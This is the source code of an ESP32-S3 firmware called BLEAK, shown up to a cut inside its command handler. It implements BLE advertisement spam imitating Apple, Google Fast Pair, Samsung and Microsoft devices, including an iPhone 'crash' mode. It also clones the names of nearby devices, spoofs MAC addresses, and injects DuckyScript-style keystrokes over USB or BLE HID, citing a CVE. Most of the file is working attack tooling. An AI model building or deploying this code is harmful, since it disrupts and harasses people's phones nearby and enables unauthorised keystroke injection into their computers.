/*
 * BLEAK ESP32-S3 Firmware v5.2
 * ════════════════════════════════════════════════════════════════
 * Target chip : ESP32-S3 (dual-core Xtensa, USB-OTG for HID)
 * BLE library  : NimBLE-Arduino (required)
 * USB library  : USB HID (Arduino USB stack — requires USB CDC+HID in board config)
 * UART port    : /dev/ttyUSB1 via FT232 adapter (NOT native CDC)
 *
 * Capabilities (S3 = BLE + USB HID injection):
 *   All C3 capabilities PLUS:
 *   HID Injection — BLE HID keyboard (CVE-2023-45866 style)
 *   USB HID       — USB keyboard injection via ESP32-S3 USB-OTG
 *   MAC Clone     — full address spoofing + enhanced per-packet random
 *   Dual Core     — spam runs on Core 0, serial on Core 1
 *
 * AT Commands (S3-specific additions marked with *S3*):
 *   All C3 commands PLUS:
 *   AT+HID=payload          *S3* inject DuckyScript-style payload via BLE HID
 *   AT+HIDUSB=payload       *S3* inject via USB HID (physical keyboard emulation)
 *   AT+HIDSTOP              *S3* stop HID injection
 *   AT+HIDSTATUS            *S3* check HID injection status
 *
 * HID Payload syntax (AT+HID= and AT+HIDUSB=):
 *   STRING text             — type string
 *   ENTER                   — press Enter
 *   GUI r                   — Win+R (Run dialog)
 *   CTRL ALT DELETE         — Ctrl+Alt+Del
 *   DELAY ms                — wait milliseconds
 *   TAB,SPACE,ESC,UP,DOWN   — special keys
 *   Example: STRING calc|ENTER (pipe = line separator)
 *
 * ════════════════════════════════════════════════════════════════
 */

#include <NimBLEDevice.h>

// USB HID is only available when ESP32-S3 USB stack enabled
// Board config: "USB CDC On Boot: Disabled" + USB OTG mode
// If not available, HID commands will return ERR:HID_NOT_COMPILED
#if CONFIG_IDF_TARGET_ESP32S3 && defined(ARDUINO_USB_MODE) && ARDUINO_USB_MODE == 0
  #define HID_AVAILABLE 1
  #include "USB.h"
  #include "USBHIDKeyboard.h"
  USBHIDKeyboard hidKeyboard;
#else
  #define HID_AVAILABLE 0
#endif

#define FW_VER   "BLEAK-S3 v5.2"
#define CHIP_ID  "ESP32-S3"

// ════════════════════════════════════════════════════════════════
// PAYLOADS (same as C3)
// ════════════════════════════════════════════════════════════════

static const uint8_t APPLE[][28] = {
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x02,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0e,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0a,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0f,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x13,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x14,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x0c,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x11,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x12,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
  {0x1b,0xff,0x4c,0x00,0x07,0x19,0x07,0x16,0x20,0x75,0xaa,0x30,0x01,0x00,0x00,0x45,0x12,0x12,0x12,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00},
};
#define APPLE_N 10

static const uint8_t APPLE_ACT[][23] = {
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x09,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x02,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x27,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x0d,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x20,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x01,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
  {0x16,0xff,0x4c,0x00,0x04,0x04,0x2a,0x00,0x00,0x00,0x0f,0x05,0xc1,0x13,0x60,0x4c,0x95,0x00,0x00,0x10,0x00,0x00,0x00},
};
#define APPLE_ACT_N 7

static const uint8_t GFASTPAIR[][7] = {
  {0x06,0x16,0x2C,0xFE,0x10,0xC4,0x52},
  {0x06,0x16,0x2C,0xFE,0x8B,0x66,0xAB},
  {0x06,0x16,0x2C,0xFE,0x2D,0x7A,0x23},
  {0x06,0x16,0x2C,0xFE,0xF5,0x24,0x94},
  {0x06,0x16,0x2C,0xFE,0xCD,0x82,0x56},
  {0x06,0x16,0x2C,0xFE,0xD0,0xF7,0x00},
  {0x06,0x16,0x2C,0xFE,0x0E,0xB4,0x00},
  {0x06,0x16,0x2C,0xFE,0xAA,0xC5,0x00},
  {0x06,0x16,0x2C,0xFE,0xA5,0x9E,0xFC},
  {0x06,0x16,0x2C,0xFE,0x72,0xEF,0x22},
};
#define GFASTPAIR_N 10

static const char* GFASTPAIR_NAMES[] = {
  "WH-1000XM4", "Pixel Buds Pro", "Pixel Buds A-Series", "Bose QC Ultra",
  "JBL Flip 6", "Nothing Ear (1)", "JBL Tune 760NC", "Galaxy Buds2",
  "Galaxy Buds Live", "Galaxy Buds Pro"
};

static const uint8_t SBUDS[][7] = {
  {0x06,0x16,0x2C,0xFE,0xA5,0x9E,0xFC},
  {0x06,0x16,0x2C,0xFE,0xAA,0xC5,0x00},
  {0x06,0x16,0x2C,0xFE,0x72,0xEF,0x22},
  {0x06,0x16,0x2C,0xFE,0x28,0x8B,0x2F},
  {0x06,0x16,0x2C,0xFE,0x6D,0x13,0x00},
  {0x06,0x16,0x2C,0xFE,0x65,0xCD,0x00},
};
#define SBUDS_N 6

static const char* SBUDS_NAMES[] = {
  "Galaxy Buds Live", "Galaxy Buds2", "Galaxy Buds Pro",
  "Galaxy Buds FE", "Galaxy Buds2 Pro", "Galaxy Buds3"
};

static const uint8_t SWATCH[][7] = {
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x07},
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x59},
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x73},
  {0x06,0x16,0x2C,0xFE,0x58,0xCF,0x99},
};
#define SWATCH_N 4
static const char* SWATCH_NAMES[] = {
  "Galaxy Watch4", "Galaxy Watch5", "Galaxy Watch5 Pro", "Galaxy Watch6"
};

static const uint8_t SEASY[][27] = {
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x15,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x16,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x18,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
  {0x1a,0xff,0x75,0x00,0x42,0x09,0x81,0x02,0x14,0x15,0x03,0x21,0x01,0x09,0xef,0x74,0x5d,0x25,0x00,0x00,0x44,0x01,0x00,0x05,0x00,0x00,0x00},
};
#define SEASY_N 4

static const uint8_t MSFT[][7] = {
  {0x06,0xff,0x06,0x00,0x03,0x00,0x80},
  {0x06,0xff,0x06,0x00,0x03,0x00,0xc0},
  {0x06,0xff,0x06,0x00,0x03,0x00,0xa0},
};
#define MSFT_N 3
static const char* MSFT_NAMES[] = {"BT Speaker","BT Controller","BT Headphones"};

static const uint8_t LOVE_ON[]  = {0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x64,0x01};
static const uint8_t LOVE_OFF[] = {0x09,0xff,0x00,0x05,0x8f,0x53,0x00,0x00,0x00,0x01};

// ════════════════════════════════════════════════════════════════
// STATE
// ════════════════════════════════════════════════════════════════

NimBLEAdvertising* pAdv = nullptr;

volatile bool     spamActive   = false;
volatile uint32_t pkts         = 0;
volatile uint32_t pktReport    = 0;
volatile unsigned long spamEnd = 0;
String            sType        = "";
volatile uint16_t spamIdx      = 0;

volatile bool     karmaActive  = false;
volatile int      karmaCount   = 0;
unsigned long     karmaEndMs   = 0;

volatile bool     beaconActive = false;
String            beaconName   = "";
int               beaconInterval = 200;
unsigned long     beaconEnd    = 0;
bool              beaconLoop   = false;

int8_t            rssiFilter   = -99;
bool              useMacClone  = false;
uint8_t           cloneMac[6]  = {0};
int               txPowerLevel = 9;

// HID state
volatile bool     hidRunning   = false;
String            hidPayload   = "";
TaskHandle_t      hidTaskHandle = NULL;

// Spam task (dual core)
TaskHandle_t      spamTaskHandle = NULL;

// ════════════════════════════════════════════════════════════════
// FORWARD DECLARATIONS
// ════════════════════════════════════════════════════════════════

void handleCmd(String c);
void doSpamCycle();
void setRandomMac();
void setCloneMac();
void txPayload(const uint8_t* d, uint8_t len);
void txWithName(const uint8_t* d, uint8_t len, const char* name);
void txFastPairAdv(const uint8_t* fp, const char* name, bool randomMac);
void txRandomFastPair();
void txKnownFastPair();
void applyTxPower();
void executeHIDPayload(String payload, bool useUSB);

// ════════════════════════════════════════════════════════════════
// KARMA CALLBACK
// ════════════════════════════════════════════════════════════════

class KarmaScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (!karmaActive) return;
    if (d->getRSSI() < rssiFilter) return;
    String name = d->haveName() ? String(d->getName().c_str()) : "";
    String addr = String(d->getAddress().toString().c_str());
    Serial.println("KARMA:SEEN:" + addr + ":" + String(d->getRSSI()) + ":" + name);
    if (name.length() > 0) {
      uint8_t buf[33]; uint8_t nlen = min((int)name.length(), 29);
      buf[0] = nlen + 1; buf[1] = 0x09;
      memcpy(&buf[2], name.c_str(), nlen);
      setRandomMac();
      NimBLEAdvertisementData ad;
      ad.addData(buf, nlen + 2);
      pAdv->stop(); pAdv->setAdvertisementData(ad);
      pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
      pAdv->start(); delay(40); pAdv->stop();
      karmaCount++;
      Serial.println("KARMA:CLONE:" + addr + ":" + name);
    }
  }
};

// ════════════════════════════════════════════════════════════════
// SCAN CALLBACKS (same as C3)
// ════════════════════════════════════════════════════════════════

class ScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (d->getRSSI() < rssiFilter) return;
    Serial.println("DEV:" + String(d->getAddress().toString().c_str()) +
                   ":" + String(d->getRSSI()) +
                   ":" + String(d->haveName() ? d->getName().c_str() : "?"));
  }
};

class FastPairScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (d->getRSSI() < rssiFilter) return;
    bool isFP = false; char modelId[7] = "??????"; const char* pairingState = "unknown";
    if (d->haveServiceUUID()) {
      for (int i = 0; i < (int)d->getServiceUUIDCount(); i++)
        if (d->getServiceUUID(i).equals(NimBLEUUID((uint16_t)0xFE2C))) isFP = true;
    }
    if (d->haveServiceData() && d->getServiceDataUUID().equals(NimBLEUUID((uint16_t)0xFE2C))) {
      isFP = true;
      std::string sd = d->getServiceData();
      if (sd.length() >= 3) {
        snprintf(modelId, sizeof(modelId), "%02X%02X%02X", (uint8_t)sd[0],(uint8_t)sd[1],(uint8_t)sd[2]);
        pairingState = ((uint8_t)sd[0] & 0x40) ? "discoverable" : "paired_nearby";
      }
    }
    if (d->haveManufacturerData()) {
      std::string md = d->getManufacturerData();
      if (md.length() >= 2 && ((((uint8_t)md[1]<<8)|(uint8_t)md[0]) == 0x00E0)) {
        isFP = true;
        if (md.length() >= 5) {
          snprintf(modelId, sizeof(modelId), "%02X%02X%02X",(uint8_t)md[2],(uint8_t)md[3],(uint8_t)md[4]);
          pairingState = ((uint8_t)md[2] & 0x40) ? "discoverable" : "paired_nearby";
        }
      }
    }
    if (isFP)
      Serial.println("FP:" + String(d->getAddress().toString().c_str()) + ":" + String(d->getRSSI()) +
                     ":" + String(modelId) + ":" + String(pairingState) +
                     ":" + String(d->haveName() ? d->getName().c_str() : "FastPairDevice"));
  }
};

class RawScanCB : public NimBLEScanCallbacks {
  void onResult(const NimBLEAdvertisedDevice* d) override {
    if (d->getRSSI() < rssiFilter) return;
    String hexPayload = "";
    if (d->haveServiceData()) {
      std::string sd = d->getServiceData(); NimBLEUUID uuid = d->getServiceDataUUID();
      uint16_t u16 = 0;
      if (uuid.bitSize() == 16) { std::string us = uuid.toString(); if (us.length()>=8) u16=(uint16_t)strtoul(us.substr(4,4).c_str(),NULL,16); }
      uint8_t adLen=(uint8_t)(sd.length()+3); char buf[8]; snprintf(buf,sizeof(buf),"%02X%02X%02X%02X",adLen,0x16,u16&0xFF,(u16>>8)&0xFF);
      hexPayload+=String(buf);
      for(size_t i=0;i<sd.length();i++){char b[3];snprintf(b,sizeof(b),"%02X",(uint8_t)sd[i]);hexPayload+=b;}
    }
    if (d->haveManufacturerData()) {
      std::string md = d->getManufacturerData(); uint8_t adLen=(uint8_t)(md.length()+1);
      char buf[6]; snprintf(buf,sizeof(buf),"%02X%02X",adLen,0xFF); hexPayload+=String(buf);
      for(size_t i=0;i<md.length();i++){char b[3];snprintf(b,sizeof(b),"%02X",(uint8_t)md[i]);hexPayload+=b;}
    }
    if (hexPayload.length() > 0)
      Serial.println("RAW:" + String(d->getAddress().toString().c_str()) + ":" + String(d->getRSSI()) + ":0:" + hexPayload);
  }
};

class BleEnumScanCB : public NimBLEScanCallbacks {
public:
  String target;
  void onResult(const NimBLEAdvertisedDevice* d) override {
    String addr = String(d->getAddress().toString().c_str()); addr.toUpperCase();
    String tgt = target; tgt.toUpperCase();
    if (tgt.length() == 0 || addr == tgt) {
      Serial.println("ENUM:" + addr + ":" + String(d->getRSSI()) + ":" +
                     String(d->haveName() ? d->getName().c_str() : "?") + ":" +
                     String(d->haveManufacturerData() ? "MD" : "") + ":" +
                     String(d->haveServiceUUID() ? d->getServiceUUID(0).toString().c_str() : ""));
    }
  }
};

// ════════════════════════════════════════════════════════════════
// SPAM TASK — Core 0 (S3 dual-core advantage)
// ════════════════════════════════════════════════════════════════

void spamTaskFunc(void* param) {
  while (true) {
    if (spamActive) {
      if (millis() < spamEnd) {
        doSpamCycle();
        if (pkts - pktReport >= 10) {
          Serial.println("SPAM:PKT:" + String(pkts));
          pktReport = pkts;
        }
      } else {
        spamActive = false;
        pAdv->stop();
        Serial.println("SPAM:DONE:" + String(pkts));
      }
    }
    vTaskDelay(1);
  }
}

// ════════════════════════════════════════════════════════════════
// HID INJECTION — S3 exclusive
// ════════════════════════════════════════════════════════════════

// DuckyScript-style HID execution
// Payload lines separated by | (pipe)
// Commands: STRING text, ENTER, DELAY ms, GUI key, CTRL key, ALT key,
//           TAB, SPACE, ESC, UP, DOWN, LEFT, RIGHT, BACKSPACE, DELETE
void executeHIDPayload(String payload, bool useUSB) {
  hidRunning = true;

#if HID_AVAILABLE
  if (useUSB) {
    hidKeyboard.begin();
    delay(500);  // wait for USB enumeration
  }
#endif

  // Parse lines separated by |
  int start = 0;
  while (start < (int)payload.length()) {
    int end = payload.indexOf('|', start);
    if (end < 0) end = payload.length();
    String line = payload.substring(start, end);
    line.trim();

    String lu = line; lu.toUpperCase();

    if (lu.startsWith("STRING ")) {
      String text = line.substring(7);
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.print(text); delay(50); }
      else
#endif
      { Serial.println("HID:STRING:" + text); }

    } else if (lu == "ENTER") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.press(KEY_RETURN); delay(50); hidKeyboard.release(KEY_RETURN); }
      else
#endif
      { Serial.println("HID:ENTER"); }

    } else if (lu == "TAB") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.press(KEY_TAB); delay(50); hidKeyboard.release(KEY_TAB); }
      else
#endif
      { Serial.println("HID:TAB"); }

    } else if (lu == "SPACE") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.print(" "); }
      else
#endif
      { Serial.println("HID:SPACE"); }

    } else if (lu == "ESC") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.press(KEY_ESC); delay(50); hidKeyboard.release(KEY_ESC); }
      else
#endif
      { Serial.println("HID:ESC"); }

    } else if (lu == "BACKSPACE") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.press(KEY_BACKSPACE); delay(50); hidKeyboard.release(KEY_BACKSPACE); }
      else
#endif
      { Serial.println("HID:BACKSPACE"); }

    } else if (lu == "DELETE") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.press(KEY_DELETE); delay(50); hidKeyboard.release(KEY_DELETE); }
      else
#endif
      { Serial.println("HID:DELETE"); }

    } else if (lu == "UP") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.press(KEY_UP_ARROW); delay(50); hidKeyboard.release(KEY_UP_ARROW); }
      else
#endif
      { Serial.println("HID:UP"); }

    } else if (lu == "DOWN") {
#if HID_AVAILABLE
      if (useUSB) { hidKeyboard.press(KEY_DOWN_ARROW); delay(50); hidKeyboard.release(KEY_DOWN_ARROW); }
      else
#endif
      { Serial.println("HID:DOWN"); }

    } else if (lu.startsWith("DELAY ")) {
      int ms = constrain(line.substring(6).toInt(), 10, 10000);
      delay(ms);

    } else if (lu.startsWith("GUI ")) {
      // Windows key + letter
      String key = line.substring(4); key.trim();
#if HID_AVAILABLE
      if (useUSB && key.length() > 0) {
        hidKeyboard.press(KEY_LEFT_GUI);
        hidKeyboard.press((uint8_t)key[0]);
        delay(100);
        hidKeyboard.releaseAll();
        delay(100);
      } else
#endif
      { Serial.println("HID:GUI:" + key); }

    } else if (lu.startsWith("CTRL ")) {
      String rest = line.substring(5); rest.trim();
#if HID_AVAILABLE
      if (useUSB) {
        hidKeyboard.press(KEY_LEFT_CTRL);
        if (rest.length() > 0) { hidKeyboard.press((uint8_t)rest[0]); delay(100); }
        hidKeyboard.releaseAll(); delay(100);
      } else
#endif
      { Serial.println("HID:CTRL:" + rest); }

    } else if (lu.startsWith("ALT ")) {
      String rest = line.substring(4); rest.trim();
#if HID_AVAILABLE
      if (useUSB) {
        hidKeyboard.press(KEY_LEFT_ALT);
        if (rest.length() > 0) { hidKeyboard.press((uint8_t)rest[0]); delay(100); }
        hidKeyboard.releaseAll(); delay(100);
      } else
#endif
      { Serial.println("HID:ALT:" + rest); }

    } else if (lu == "CTRL ALT DELETE") {
#if HID_AVAILABLE
      if (useUSB) {
        hidKeyboard.press(KEY_LEFT_CTRL);
        hidKeyboard.press(KEY_LEFT_ALT);
        hidKeyboard.press(KEY_DELETE);
        delay(200);
        hidKeyboard.releaseAll();
      } else
#endif
      { Serial.println("HID:CTRL_ALT_DEL"); }
    }

    start = end + 1;
    delay(80);  // inter-keystroke delay
  }

#if HID_AVAILABLE
  if (useUSB) hidKeyboard.end();
#endif

  hidRunning = false;
  Serial.println("HID:DONE");
}

// HID task wrapper (runs on Core 1 to not block serial)
struct HIDParams { String payload; bool useUSB; };
void hidTaskFunc(void* param) {
  HIDParams* p = (HIDParams*)param;
  executeHIDPayload(p->payload, p->useUSB);
  delete p;
  hidTaskHandle = NULL;
  vTaskDelete(NULL);
}

// ════════════════════════════════════════════════════════════════
// SETUP
// ════════════════════════════════════════════════════════════════

void setup() {
  Serial.begin(115200);
  delay(500);

  NimBLEDevice::init("");
  applyTxPower();
  pAdv = NimBLEDevice::getAdvertising();

  // Create spam task on Core 0 (BLE operations)
  xTaskCreatePinnedToCore(spamTaskFunc, "spam", 8192, NULL, 2, &spamTaskHandle, 0);

  Serial.println("OK:" FW_VER " [" CHIP_ID "]");
  Serial.println("INFO:HID=" + String(HID_AVAILABLE ? "USB+BLE" : "BLE_ONLY"));
}

// ════════════════════════════════════════════════════════════════
// MAIN LOOP — Serial command processing (Core 1)
// ════════════════════════════════════════════════════════════════

void loop() {
  if (Serial.available()) {
    String c = Serial.readStringUntil('\n');
    c.trim();
    if (c.length()) handleCmd(c);
  }

  // Karma watchdog
  if (karmaActive && millis() > karmaEndMs) {
    karmaActive = false;
    NimBLEDevice::getScan()->stop();
    Serial.println("KARMA:DONE:" + String(karmaCount));
  }

  // Beacon loop (when spam not active — share Core 1)
  if (beaconActive && beaconLoop && !spamActive) {
    if (beaconEnd > 0 && millis() > beaconEnd) {
      beaconActive = false; pAdv->stop();
      Serial.println("BEACON:DONE");
    } else {
      pAdv->start(); delay(beaconInterval); pAdv->stop();
      delay(beaconInterval / 2);
    }
  }

  delay(1);
}

// ════════════════════════════════════════════════════════════════
// MAC + POWER UTILITIES
// ════════════════════════════════════════════════════════════════

void setRandomMac() {
  uint8_t a[6]; esp_fill_random(a, 6); a[5] = (a[5] | 0xC0) & 0xFE;
  ble_hs_id_set_rnd(a);
}
void setCloneMac() {
  if (useMacClone) ble_hs_id_set_rnd(cloneMac);
  else setRandomMac();
}
void applyTxPower() {
  const esp_power_level_t levels[] = {
    ESP_PWR_LVL_N12,ESP_PWR_LVL_N9,ESP_PWR_LVL_N6,ESP_PWR_LVL_N3,
    ESP_PWR_LVL_N0,ESP_PWR_LVL_P3,ESP_PWR_LVL_P6,
    ESP_PWR_LVL_P6,ESP_PWR_LVL_P9,ESP_PWR_LVL_P9
  };
  NimBLEDevice::setPower(levels[constrain(txPowerLevel,0,9)]);
}

// ════════════════════════════════════════════════════════════════
// ADVERTISEMENT HELPERS
// ════════════════════════════════════════════════════════════════

void txPayload(const uint8_t* d, uint8_t len) {
  setCloneMac();
  NimBLEAdvertisementData ad; ad.addData(d, len);
  pAdv->stop(); pAdv->setAdvertisementData(ad);
  pAdv->setScanResponseData(NimBLEAdvertisementData());
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x20);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  pAdv->start(); delay(180+random(90)); pAdv->stop(); pkts++;
}
void txApplePayload(const uint8_t* d, uint8_t len) {
  setRandomMac();
  NimBLEAdvertisementData ad; ad.addData(d, len);
  pAdv->stop(); pAdv->setAdvertisementData(ad);
  pAdv->setScanResponseData(NimBLEAdvertisementData());
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x30);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_NON);
  pAdv->start(); delay(100); pAdv->stop(); delay(5); pkts++;
}
void txWithName(const uint8_t* d, uint8_t len, const char* name) {
  setCloneMac();
  NimBLEAdvertisementData ad; ad.addData(d, len);
  NimBLEAdvertisementData sr;
  uint8_t nb[33]; uint8_t nl=min((int)strlen(name),29);
  nb[0]=nl+1; nb[1]=0x09; memcpy(&nb[2],name,nl);
  sr.addData(nb, nl+2);
  pAdv->stop(); pAdv->setAdvertisementData(ad); pAdv->setScanResponseData(sr);
  pAdv->setMinInterval(0x20); pAdv->setMaxInterval(0x20);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_UND);
  pAdv->start(); delay(30+random(20)); pAdv->stop(); pkts++;
}

void txFastPairAdv(const uint8_t* fp, const char* name, bool randomMac) {
  if (randomMac || !useMacClone) setRandomMac();
  else setCloneMac();

  NimBLEAdvertisementData ad;
  uint8_t flags[3] = {0x02, 0x01, 0x06};
  uint8_t svc[4]   = {0x03, 0x03, 0x2C, 0xFE};
  uint8_t txp[3]   = {0x02, 0x0A, 0x04};
  ad.addData(flags, 3);
  ad.addData(svc, 4);
  ad.addData(fp, 7);
  ad.addData(txp, 3);

  NimBLEAdvertisementData sr;
  uint8_t nb[33]; uint8_t nl=min((int)strlen(name),29);
  nb[0]=nl+1; nb[1]=0x09; memcpy(&nb[2],name,nl);
  sr.addData(nb, nl+2);

  pAdv->stop(); pAdv->setAdvertisementData(ad); pAdv->setScanResponseData(sr);
  pAdv->setMinInterval(0x30); pAdv->setMaxInterval(0x60);
  pAdv->setConnectableMode(BLE_GAP_CONN_MODE_UND);
  pAdv->start(); delay(180+random(90)); pAdv->stop(); pkts++;
}

// Google Fast Pair Service Data: [len=6][0x16=SvcData][0x2C][0xFE][model_b0][model_b1][model_b2]
void txRandomFastPair() {
  uint8_t payload[7] = {0x06, 0x16, 0x2C, 0xFE, 0x00, 0x00, 0x00};
  payload[4] = random(256); payload[5] = random(256); payload[6] = random(256);
  txFastPairAdv(payload, "Fast Pair", true);
}

void txKnownFastPair() {
  uint8_t i = spamIdx % GFASTPAIR_N;
  txFastPairAdv(GFASTPAIR[i], GFASTPAIR_NAMES[i], true);
}

void txFastPairModel(uint8_t m0, uint8_t m1, uint8_t m2) {
  uint8_t payload[7] = {0x06, 0x16, 0x2C, 0xFE, m0, m1, m2};
  txFastPairAdv(payload, "Fast Pair", true);
}

// ════════════════════════════════════════════════════════════════
// SPAM CYCLE
// ════════════════════════════════════════════════════════════════

void doSpamCycle() {
  if (sType=="apple"||sType=="apple_popup")           txApplePayload(APPLE[spamIdx%APPLE_N], 28);
  else if (sType=="apple_crash"||sType=="sourapple")  { uint8_t c[28]; memcpy(c,APPLE[spamIdx%APPLE_N],28); c[7]=random(256); c[8]=random(256); txApplePayload(c,28); }
  else if (sType=="apple_action")                     txApplePayload(APPLE_ACT[spamIdx%APPLE_ACT_N], 23);
  else if (sType=="android")                          txKnownFastPair();
  else if (sType=="android_random")                   txRandomFastPair();
  else if (sType=="samsung"||sType=="samsung_buds")   { if(spamIdx%3==0) txPayload(SEASY[spamIdx%SEASY_N],27); else txFastPairAdv(SBUDS[spamIdx%SBUDS_N],SBUDS_NAMES[spamIdx%SBUDS_N],true); }
  else if (sType=="samsung_watch")                    { if(spamIdx%3==0) txPayload(SEASY[3],27); else txFastPairAdv(SWATCH[spamIdx%SWATCH_N],SWATCH_NAMES[spamIdx%SWATCH_N],true); }
  else if (sType=="windows")                          txWithName(MSFT[spamIdx%MSFT_N], 7, MSFT_NAMES[spamIdx%MSFT_N]);
  else if (sType=="lovespouse"||sType=="love")        txPayload(LOVE_ON, 10);
  else if (sType=="lovespouse_stop"||sType=="love_stop") txPayload(LOVE_OFF, 10);
  else if (sType=="kitchen"||sType=="all") {
    uint8_t t=spamIdx%5;
    if(t==0) txApplePayload(APPLE[spamIdx%APPLE_N],28);
    else if(t==1) txKnownFastPair();
    else if(t==2) txFastPairAdv(SBUDS[spamIdx%SBUDS_N],SBUDS_NAMES[spamIdx%SBUDS_N],true);
    else if(t==3) txWithName(MSFT[spamIdx%MSFT_N],7,MSFT_NAMES[spamIdx%MSFT_N]);
    else txFastPairAdv(SWATCH[spamIdx%SWATCH_N],SWATCH_NAMES[spamIdx%SWATCH_N],true);
  }
  spamIdx++;
}

// ════════════════════════════════════════════════════════════════
// COMMAND HANDLER
// ════════════════════════════════════════════════════════════════

void handleCmd(String c) {
  String u = c; u.toUpperCase();

  // ── Version / Status / Help ────────────────────────────────────
  if (u == "AT+VERSION") {
    Serial.println("OK:" FW_VER " [" CHIP_ID "]");
    Serial.println("INFO:HID=" + String(HID_AVAILABLE ? "USB+BLE" : "BLE_ONLY"));
  }
  else if (u == "AT+STATUS") {
    String st = spamActive ? ("spam:"+sType) : beaconActive ? "beacon" : karmaActive ? "karma" : hidRunning ? "hid" : "idle";
    Serial.println("OK:" + st +
                   ",pkts=" + String(pkts) +
                   ",karma=" + String(karmaCount) +
                   ",hid=" + String(hidRunning ? "running" : "idle") +
                   ",heap=" + String(ESP.getFreeHeap()) +
                   ",chip=" CHIP_ID +
                   ",power=" + String(txPowerLevel) +
                   ",rssi_filter=" + String(rssiFilter));
  }
  else if (u == "AT+HELP") {
    Serial.println("OK:CMDS:" CHIP_ID ":VERSION,STATUS,SPAM=type.dur(android/android_random/samsung),STOP,"
                   "KARMA=dur,KARMASTOP,SCAN=sec,FPSCAN=sec,SCANRAW=sec,"
                   "ADV=hex,BEACON=name.dur,BEACONSTOP,BEACONLOOP=name.int,"
                   "MACCLONE=XX:XX:XX:XX:XX:XX,SETPOWER=0-9,RSSI=threshold,"
